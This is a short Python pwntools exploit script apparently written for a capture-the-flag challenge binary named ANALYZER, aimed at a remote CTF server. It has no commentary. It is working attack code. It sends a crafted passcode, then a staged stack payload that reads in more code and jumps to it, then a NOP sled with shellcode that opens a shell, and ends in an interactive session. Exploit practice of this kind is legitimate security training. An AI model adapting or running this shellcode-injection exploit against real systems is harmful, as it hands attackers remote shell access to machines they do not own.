#!/usr/bin/env python3
from pwn import *
import sys
import pwnlib.shellcraft
import pwnlib
import time

pwn_file = "./ANALYZER"
elf = ELF(pwn_file)
context.os='linux'
context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

context.log_level = 100
context.log_level = 'debug'


#c = process(pwn_file)
dbg_script = """
b *main-0xd5f+0xeb5
b *main-0xd5f+0xcfd
"""
#gdb.attach(c,dbg_script)
c = remote('ctf.adl.tw', '11005')
shellcode = asm(shellcraft.sh())
print(len(shellcode))
avoid = b'h'
c.sendafter('Enter your passcode:', p64(0x14ba85) + b'\0' * (11 - 8 - 2) + b'\xcd\x80')

payload = asm(shellcraft.read(0, 'esp', '0x220'))[:-2]  + flat({0: asm('sub ecx, 0x30')}, filler=b'\x90', length = 0x24) + b'\xe9\x1b\xff\xff\xff'
c.sendafter(' format:', payload)
sleep(0.1)
c.send(asm('nop') * 0x100 + asm(shellcraft.sh()))
#c.sendlineafter('Input:', c.recvn(16))
c.interactive()
c.close()
